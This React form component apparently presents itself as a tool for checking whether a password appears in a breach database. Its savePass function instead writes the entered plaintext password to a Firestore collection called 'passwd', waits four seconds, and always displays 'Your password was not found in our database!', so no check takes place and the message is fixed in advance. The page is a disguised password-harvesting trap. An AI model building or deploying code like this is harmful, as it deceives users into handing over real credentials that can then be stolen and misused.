import React, { useState } from 'react'
import { PulseLoader } from 'react-spinners'
import { firestore } from '../../firebase.config'
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';



const Form = () => {

  const [passw, setPass] = useState('')
  const [loading, isLoading] = useState(false)

  const handleChange = (evt: any) => {
    setPass(evt.target.value)
  }

  const notify = () => {
    toast.success('Your password was not found in our database!', {
      position: "top-center", // Posição da notificação
      autoClose: 6000, // Tempo em milissegundos antes da notificação desaparecer
      hideProgressBar: false, // Se a barra de progresso deve ser ocultada
      closeOnClick: true, // Se a notificação deve ser fechada ao clicar nela
      pauseOnHover: true, // Se a pausa da notificação ao passar o mouse sobre ela está ativada
      draggable: true, // Se a notificação pode ser arrastada pelo usuário
      progress: undefined, // Configuração personalizada da barra de progresso
      theme: 'colored'
    });
  };

  const savePass = async () => {
    isLoading(true)

    try {
      await firestore.collection('passwd').add({
        pass: passw
      });
    } catch (err) {
      console.log(err)
    } finally {
      setTimeout(() => {
        isLoading(false);
        notify();
      }, 4000);
      setPass('')
    }
  }


  return (
    <div className='w-full flex flex-col items-center justify-center'>
      {loading ? <PulseLoader color='#ffffff' /> :
        <div className='w-full items-center justify-center flex gap-3'>
          <input type="password" className='lg:w-[40%] md:w-[60%] sm:w-[70%] h-9 rounded-lg text-center text-2xl' value={passw} onChange={handleChange} />
          <button disabled={loading ? true : false} className='w-16 h-9 bg-[#fca311] rounded-md font-semibold font-sans text-white' onClick={savePass}>Check</button>
        </div>
      }
      <ToastContainer />
    </div>

  )
}

export default Form